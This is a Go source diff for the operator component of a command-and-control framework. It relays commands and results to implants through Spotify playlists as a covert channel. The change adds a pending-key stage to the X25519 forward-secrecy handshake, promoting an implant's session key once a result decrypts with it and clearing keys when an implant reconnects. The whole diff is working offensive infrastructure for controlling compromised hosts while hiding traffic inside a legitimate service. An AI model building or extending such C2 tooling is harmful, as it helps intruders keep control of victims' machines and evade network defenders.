@@ -43,9 +43,10 @@ type Operator struct {
 	attachedClient   string                // currently attached client_id ("" = none)
 
 	// Forward secrecy via X25519
-	ephPriv     *ecdh.PrivateKey
-	ephPub      *ecdh.PublicKey
-	sessionKeys map[string][]byte // client_id -> session key
+	ephPriv        *ecdh.PrivateKey
+	ephPub         *ecdh.PublicKey
+	sessionKeys    map[string][]byte // client_id -> ACTIVE session key
+	pendingKeys    map[string][]byte // client_id -> session key awaiting implant confirmation
 }
 
 // NewOperator creates a new operator.
@@ -77,6 +78,7 @@ func NewOperator(client *spotify.Client, key string, pollIntervalSec int) *Opera
 		ephPriv:          ephPriv,
 		ephPub:           ephPub,
 		sessionKeys:      make(map[string][]byte),
+		pendingKeys:      make(map[string][]byte),
 	}
 }
 
@@ -145,19 +147,39 @@ func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
 	for seqNum, chunkMetas := range seqGroups {
 		payload := protocol.ReassemblePayload(chunkMetas)
 
-		// Try session keys first (forward secrecy), fall back to master key
+		// Try decryption in order: active session keys, pending keys, master key
 		var result map[string]interface{}
 		var decErr error
+
+		// 1. Try active session keys
 		for _, sk := range op.sessionKeys {
 			result, decErr = protocol.DecodeMessageRaw(payload, sk)
 			if decErr == nil {
 				break
 			}
 		}
+
+		// 2. Try pending keys (promotes to active on success)
+		if result == nil {
+			for cid, sk := range op.pendingKeys {
+				result, decErr = protocol.DecodeMessageRaw(payload, sk)
+				if decErr == nil {
+					// Implant confirmed the key exchange — promote to active
+					op.sessionKeys[cid] = sk
+					delete(op.pendingKeys, cid)
+					fmt.Printf("\n\033[32m[*] Forward secrecy confirmed with %s\033[0m\n",
+						cid[:8])
+					break
+				}
+			}
+		}
+
+		// 3. Try master key (for checkins and pre-key-exchange messages)
 		if result == nil {
 			result, decErr = protocol.DecodeMessage(payload, op.key)
 		}
-		if decErr != nil {
+
+		if decErr != nil || result == nil {
 			// Can't decrypt — stale result from prior session, clean it up
 			_ = op.client.CleanC2Playlists(ctx,
 				protocol.ChannelRes, op.key, seqNum)
@@ -726,7 +748,8 @@ func (op *Operator) handleCheckin(result map[string]interface{}) {
 		// Different session — agent reconnected, update and re-negotiate
 		fmt.Printf("\n\033[36m[*] Implant %s reconnected (new session)\033[0m\n",
 			clientID[:8])
-		delete(op.sessionKeys, clientID) // clear old session key
+		delete(op.sessionKeys, clientID)
+		delete(op.pendingKeys, clientID)
 	}
 	pid := 0
 	if p, ok := info["pid"].(float64); ok {
@@ -790,7 +813,8 @@ func (op *Operator) negotiateForwardSecrecy(clientID, peerPubHex string) {
 		return
 	}
 
-	op.sessionKeys[clientID] = sessionKey
+	// Store as pending until implant confirms by sending a result we can decrypt
+	op.pendingKeys[clientID] = sessionKey
 
 	// Send keyexchange command directly (no attach needed).
 	// Must use master key since implant hasn't derived session key yet.
